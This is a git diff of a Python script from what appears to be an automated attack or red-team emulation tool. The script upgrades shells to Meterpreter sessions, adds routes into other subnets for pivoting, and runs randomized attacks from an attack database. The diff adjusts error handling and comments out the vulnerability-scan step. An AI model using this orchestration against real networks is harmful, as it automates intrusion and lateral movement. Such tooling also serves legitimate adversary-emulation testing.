@@ -62,6 +62,12 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
         if(atk_sess!=None):
             met_sess=mc.upgrade_shell(atk_sess)
+            if(met_sess):
+                print(f"{C.COL_YELLOW}[*] session upgraded to Meterpreter session{C.COL_RESET}")
+            else:
+                print(f"{C.COL_RED}[*] upgrading session to Materpreter session failed, skipping...{C.COL_RESET}")
+                continue
+
 
 
         if(target_ip in other_subnet):
@@ -72,14 +78,12 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
             if(atk_sess!=None):
                 print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
-                print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
                 mc.route_add(met_sess["id_sess"], target_ip)
                 mc.route_print()
                 router=met_sess
-            else:
-                #print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
-                continue
+            
         
+        """
         if(stealth):
             scans=list(Attack_DB.stealth_scans_dict)
         else:
@@ -100,6 +104,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
         
         mc.attempt_scan(scan_obj)
+        """
 
         for ra in randomized_attack:
             attack_name=Attack_DB.attack_dict[ra].attack
